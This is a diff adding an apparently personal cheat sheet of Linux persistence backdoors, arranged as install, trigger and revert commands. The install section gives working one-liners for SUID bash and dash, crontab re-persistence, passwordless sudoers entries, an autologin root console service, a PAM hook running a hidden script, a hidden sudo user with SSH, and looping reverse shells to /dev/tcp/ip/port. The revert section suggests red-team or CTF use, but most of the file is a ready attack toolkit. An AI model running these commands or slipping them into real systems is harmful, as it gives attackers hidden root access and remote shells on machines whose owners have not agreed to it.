@@ -1,0 +1,47 @@
+# backdoors
+chmod u+s /bin/bash
+chmod u+s /bin/dash
+echo '* * * * * root chmod u+s /bin/bash' >> /etc/crontab
+echo '* * * * * root chmod u+s /bin/dash' >> /etc/crontab
+echo 'username ALL=(ALL) NOPASSWD: /bin/bash' | sudo tee /etc/sudoers.d/backdoor > /dev/null && sudo chown root:root /etc/sudoers.d/backdoor && sudo chmod 440 /etc/sudoers.d/backdoor && sudo visudo -c
+echo 'username ALL=(ALL) NOPASSWD: /bin/dash' | sudo tee /etc/sudoers.d/backdoor > /dev/null && sudo chown root:root /etc/sudoers.d/backdoor && sudo chmod 440 /etc/sudoers.d/backdoor && sudo visudo -c
+echo -e "[Service]\nExecStart=/sbin/agetty --autologin root --noclear tty8 linux\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service && systemctl enable backdoor.service && systemctl start backdoor.service
+echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/.backdoor && chmod +x /usr/local/bin/.backdoor && echo 'auth optional pam_exec.so expose_authtok /usr/local/bin/.backdoor' >> /etc/pam.d/common-auth
+echo -e '#!/bin/bash\nchmod u+s /bin/dash' > /usr/local/bin/.backdoor && chmod +x /usr/local/bin/.backdoor && echo 'auth optional pam_exec.so expose_authtok /usr/local/bin/.backdoor' >> /etc/pam.d/common-auth
+useradd -m backdoor_user && echo "backdoor_user:CustomPassword" | chpasswd && usermod -aG sudo backdoor_user && usermod -s /bin/bash backdoor_user
+useradd -m backdoor_user && echo "backdoor_user:CustomPassword" | chpasswd && usermod -aG sudo backdoor_user && usermod -s /bin/bash backdoor_user && sudo apt update && sudo apt install -y openssh-server && sudo systemctl start ssh && sudo systemctl enable ssh
+echo '* * * * * root bash -c "while true; do bash -i >& /dev/tcp/ip/port 0>&1; sleep 10; done"' >> /etc/crontab
+echo -e "[Unit]\nAfter=network.target\n\n[Service]\nExecStart=/bin/bash -c \"while true; do bash -i >& /dev/tcp/ip/port 0>&1; sleep 10; done\"\nRestart=always\nUser=root\nStandardOutput=null\nStandardError=null\n\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/backdoor.service > /dev/null && sudo systemctl enable backdoor.service && sudo systemctl start backdoor.service
+echo -e '#!/bin/bash\nwhile true; do bash -i >& /dev/tcp/ip/port 0>&1; sleep 10; done &' > /usr/local/bin/.backdoor && chmod +x /usr/local/bin/.backdoor && echo 'auth optional pam_exec.so expose_authtok /usr/local/bin/.backdoor' >> /etc/pam.d/common-auth
+
+# exec
+bash -p
+dash -p
+bash -p
+dash -p
+sudo bash
+sudo dash
+Ctrl+Alt+F8
+bash -p
+dash -p
+su backdoor_user
+ssh backdoor_user@ip
+nc -lnvp port
+nc -lnvp port
+nc -lnvp port
+
+# revert
+sudo chmod u-s /bin/bash
+sudo chmod u-s /bin/dash
+sudo sed -i '/chmod u+s \/bin\/bash/d' /etc/crontab && sudo chmod u-s /bin/bash
+sudo sed -i '/chmod u+s \/bin\/dash/d' /etc/crontab && sudo chmod u-s /bin/dash
+sudo rm -f /etc/sudoers.d/backdoor && sudo visudo -c
+sudo rm -f /etc/sudoers.d/backdoor && sudo visudo -c
+sudo systemctl disable backdoor.service && sudo systemctl stop backdoor.service && sudo rm -f /etc/systemd/system/backdoor.service
+sudo sed -i '/auth optional pam_exec.so expose_authtok \/usr\/local\/bin\/.backdoor/d' /etc/pam.d/common-auth && sudo rm -f /usr/local/bin/.backdoor && sudo chmod u-s /bin/bash
+sudo sed -i '/auth optional pam_exec.so expose_authtok \/usr\/local\/bin\/.backdoor/d' /etc/pam.d/common-auth && sudo rm -f /usr/local/bin/.backdoor && sudo chmod u-s /bin/dash
+sudo userdel -r backdoor_user
+sudo pkill -9 -u backdoor_user && sleep 5 && sudo userdel -r backdoor_user && sudo apt remove --purge -y openssh-server && sudo systemctl stop ssh && sudo systemctl disable ssh
+sudo sed -i '/bash -i >& \/dev\/tcp\/ip\/port/d' /etc/crontab && sudo kill $(ps aux | grep '/dev/tcp' | awk '{print $2}')
+sudo systemctl disable backdoor.service && sudo systemctl stop backdoor.service && sudo rm -f /etc/systemd/system/backdoor.service
+sudo sed -i '/auth optional pam_exec.so expose_authtok \/usr\/local\/bin\/.backdoor/d' /etc/pam.d/common-auth && sudo rm -f /usr/local/bin/.backdoor
